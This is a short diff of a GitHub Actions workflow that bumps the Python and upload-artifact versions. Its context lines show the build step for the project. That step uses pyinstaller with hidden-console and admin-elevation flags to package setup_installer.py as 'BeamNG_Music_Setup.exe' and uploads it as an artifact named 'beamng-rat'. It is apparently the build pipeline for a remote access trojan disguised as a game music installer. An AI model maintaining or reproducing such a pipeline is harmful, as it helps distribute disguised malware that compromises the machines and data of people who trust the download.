@@ -14,7 +14,7 @@ jobs:
     - name: Set up Python
       uses: actions/setup-python@v4
       with:
-        python-version: '3.10'
+        python-version: '3.11'
     
     - name: Install dependencies
       run: |
@@ -29,7 +29,7 @@ jobs:
         pyinstaller --onefile --noconsole --uac-admin setup_installer.py --name BeamNG_Music_Setup.exe
     
     - name: Upload artifacts
-      uses: actions/upload-artifact@v3
+      uses: actions/upload-artifact@v4
       with:
         name: beamng-rat
         path: dist/*.exe
